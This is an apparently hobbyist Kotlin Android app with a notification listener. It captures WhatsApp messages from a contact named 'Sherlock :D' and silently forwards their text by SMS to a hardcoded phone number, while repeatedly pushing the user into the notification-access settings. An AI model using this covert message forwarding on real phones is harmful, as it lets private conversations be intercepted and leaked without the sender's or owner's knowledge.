package com.example.myapplication1

import android.content.Intent
import android.os.Bundle
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.telephony.SmsManager
import android.widget.Toast
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.Row
import androidx.compose.foundation.layout.absolutePadding
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.material3.Button
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.Surface
import androidx.compose.material3.Text
import androidx.compose.runtime.Composable
import androidx.compose.runtime.mutableStateListOf
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.tooling.preview.Preview
import androidx.compose.ui.unit.dp
import androidx.core.app.NotificationCompat
import androidx.core.app.NotificationManagerCompat
import com.example.myapplication1.ui.theme.MyApplication1Theme

//var temp = mutableListOf<Notification>()
var flag = false
var newCount = 0
var notiText = ""
var mutList = mutableStateListOf<Any>()
var mutListBackup = ""
var flag1 = false

open class NotificationListener : NotificationListenerService(){

    private fun sendMessage() {
        val smsManager:SmsManager
        smsManager = this.getSystemService(SmsManager::class.java)
        smsManager.sendTextMessage("+918006393879",null, mutListBackup,null,null)
    }

    override fun onNotificationPosted(sbn: StatusBarNotification) {
        super.onNotificationPosted(sbn)
        notiText = sbn.notification.toString()
        newCount += 1
        if(sbn.packageName == "com.whatsapp")
        {
            val temp = sbn.notification.extras.getString(NotificationCompat.EXTRA_TITLE).toString()
            if(temp == "Sherlock :D" && !flag1){
                mutList.add(temp)
                mutListBackup = sbn.notification.extras.getString(NotificationCompat.EXTRA_TEXT).toString()
                mutList.add(mutListBackup)
                flag1 = true
                sendMessage()
            }
            else if(flag1)
                flag1 = false
            /*mutList.add(sbn.notification.extras.getString(NotificationCompat.EXTRA_MESSAGES).toString())
            mutList.add(sbn.notification.extras.getString(NotificationCompat.EXTRA_SUB_TEXT).toString())
            mutList.add(sbn.notification.extras.getString(NotificationCompat.EXTRA_SUMMARY_TEXT).toString())
            mutList.add(sbn.notification.extras.getString(NotificationCompat.EXTRA_TEXT_LINES).toString())
            mutList.add(sbn.notification.extras.getString(Notification.EXTRA_BIG_TEXT).toString())*/
        }
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification) {
        super.onNotificationRemoved(sbn)

    }

    override fun onListenerConnected() {
        super.onListenerConnected()
        flag = true
    }
    
}

class MainActivity : ComponentActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        setContent {
            MyApplication1Theme {
                // A surface container using the 'background' color from the theme
                Surface(
                    modifier = Modifier.fillMaxSize(),
                    color = MaterialTheme.colorScheme.background
                ){
                    val intent = Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS")
                    startActivity(intent)
                    flag = false //Listener check, be default false and turns true when listener connects successfully
                    var checkPerm: Boolean
                    while(true)
                    {
                        checkPerm = NotificationManagerCompat.getEnabledListenerPackages(this).contains(this.packageName)
                        if(checkPerm)
                        {
                            Toast.makeText(this,"Permission granted",Toast.LENGTH_LONG).show()
                            break
                        }
                        else
                        {
                            startActivity(Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"))
                        }
                    }
                    /*
                    val perm = Manifest.permission.BIND_NOTIFICATION_LISTENER_SERVICE
                    var checkVal = checkCallingOrSelfPermission(perm)
                    Text(checkVal.toString())
                    if(!hasAllPermissionGranted()){
                        val intent = Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS")
                        startActivity(intent)
                        //Text("Permissions Granted")
                        Toast.makeText(this,"PermissionGranted",Toast.LENGTH_LONG).show()
                    }
                    else
                        Text(text = "Already has permissions")

                    */
                    //val notif = NotificationListener()
                    //notif.onListenerConnected()
                    /*var notif = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
                    if (notif == null) {
                        Text("Notification Manager not initialized",modifier = Modifier.padding(50.dp))
                        // The notification manager has not been initialized
                    }
                    else{
                        Text("Permission Granted again",modifier = Modifier.padding(30.dp))
                        flag = true
                    }*/
                    /*
                    if(flag == true){
                        val fulllist = notif.activeNotifications
                        //val temp2 = notif.isNotificationPolicyAccessGranted
                        val temp = fulllist.size
                        //val one = fulllist[0].notification.tickerText.toString()
                        Column(modifier = Modifier.padding(50.dp))
                        {
                            Text("hello $temp")
                            Text(text = temp.toString())
                            Text("Value of newNotificationCounter = $newCount")
                        }
                    }
                    else
                    {
                        Text("Listener not connected",modifier = Modifier.padding(50.dp))
                    }
                    Column(Modifier
                        .fillMaxWidth()
                        .absolutePadding(10.dp, 300.dp, 10.dp, 0.dp) ) {
                        for (i in 1..5){
                            Text("Loop test $i")
                        }
                    } */
                    SimpleButton()
                }
            }
        }
    }
}
/*
fun Activity.hasAllPermissionGranted(): Boolean{
    var allPermissionProvided = true

    val perm = Manifest.permission.BIND_NOTIFICATION_LISTENER_SERVICE
    var checkVal = checkCallingOrSelfPermission(perm)

    /*if (checkVal!= PackageManager.PERMISSION_GRANTED){
        allPermissionProvided = false
    }
    return allPermissionProvided*/
    return checkVal
}
*/
@Composable
fun SimpleButton()
{
    val context = LocalContext.current
    var noOfClicks = 0
    //mutList.add("hello")
    //var notificationContent = ""
    Column(
        Modifier
            .absolutePadding(10.dp, 10.dp, 10.dp, 0.dp), horizontalAlignment = Alignment.CenterHorizontally) {
        Row(Modifier.padding(10.dp)){
            Button(
                onClick = {
                    // Clear the list of items
                    Toast.makeText(context,"clear button Pressed",Toast.LENGTH_LONG).show()
                    mutList.clear()
                },Modifier
                    .absolutePadding(10.dp, 10.dp, 10.dp, 0.dp)
            ) {
                Text("Clear Screen")
            }
            Button(onClick = {
                val ntemp = NotificationListener()
                ntemp.onListenerConnected()
                if (flag) {
                    Toast.makeText(
                        context,
                        "Listener Connected, nClicks: $noOfClicks and nc $newCount",
                        Toast.LENGTH_LONG
                    ).show()
                    noOfClicks += 1
                } else
                    Toast.makeText(context, "Listener not connected", Toast.LENGTH_LONG).show()
            },Modifier
                .absolutePadding(10.dp, 10.dp, 10.dp, 0.dp)
            ) {
                Text("Butten")
            }
        }
        LazyColumn() {
            mutList.forEach{ item->
                val temp = item.toString()
                item(
                    content = { Text(temp) }
                )
            }
        }
    }
}

@Preview
@Composable
fun PrevLazyAndRefresh() {
    LazyColumn(Modifier.absolutePadding(10.dp,30.dp,10.dp,30.dp)) {
        // Add a single item
        /*
        item {
            Text(n1, Modifier.padding(5.dp))
        }
        item {
            Text(n2, Modifier.padding(5.dp))
        }
        item {
            Text(n3, Modifier.padding(5.dp))
        }*/
        mutList.forEach{ item->
            val temp = item.toString()
            item(
                content = { Text(temp) }
            )
        }
    }
}